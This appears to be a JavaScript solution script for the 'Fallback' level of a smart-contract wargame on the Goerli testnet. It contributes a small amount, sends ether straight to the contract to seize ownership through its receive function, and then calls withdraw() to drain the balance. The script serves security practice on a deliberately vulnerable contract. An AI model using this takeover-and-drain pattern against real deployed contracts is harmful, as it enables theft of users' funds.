const { ethers } = require("ethers");
require('dotenv').config();

const Goerli_URL = process.env.Goerli_URL
const Private_KEY = process.env.Private_KEY

async function fallback() {

    //生成goerli的provider
    console.log("Goerli_URL===" + Goerli_URL);
    const provider = new ethers.providers.StaticJsonRpcProvider(Goerli_URL);

    //校验网络是不是goerli
    const network = await provider.getNetwork();
    console.log("network===" + network.name);

    //fallback合约的abi地址
    const abi = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"contribute","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0xd7bb99ba"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"contributions","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x42e94c90"},{"inputs":[],"name":"getContribution","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xf10fdf5c"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0x3ccfd60b"},{"stateMutability":"payable","type":"receive","payable":true}]';

    //合约地址
    const contract_address = process.env.FALLBACK_ADDRESS;

    //创建钱包对象
    const wallet = new ethers.Wallet(Private_KEY, provider);
    //创建合约对象
    const contract = new ethers.Contract(contract_address, abi, wallet);

    //查看合约的owner,如果通关成功，那么owner会变成钱包地址。
    const owner = await contract.owner();
    console.log("owner==" + owner);

    //调用fallback的contribution()函数，查看当前合约的贡献者
    const contributions = await contract.getContribution();
    console.log("contributions===" + contributions);

    //构建调用contribute()的数据
    const tx = {value: ethers.utils.parseEther("0.0001"), gasPrice: 2100000, gasLimit: 80000}

    //调用contribute()函数
    const receipt = await contract.contribute(tx);
    await receipt.wait();
    console.log("receipt===" + receipt);

    //再次查看贡献者与上面对比是否有变化，如果有变化说明contract.contribute(tx);执行成功
    const contribution = await contract.getContribution();
    console.log("contribution===" + contribution);

    //向合约地址发送ether
    const receipts = await wallet.sendTransaction({to: contract_address, value: ethers.utils.parseEther("0.000000000000000001")});
    await receipts.wait();
    console.log("receipts===" + receipts);

    //调用合约withdraw()方法，提取所有余额
    const withdraw = await contract.withdraw();
    console.log("withdraw===" + withdraw);
}
//调用函数
fallback();
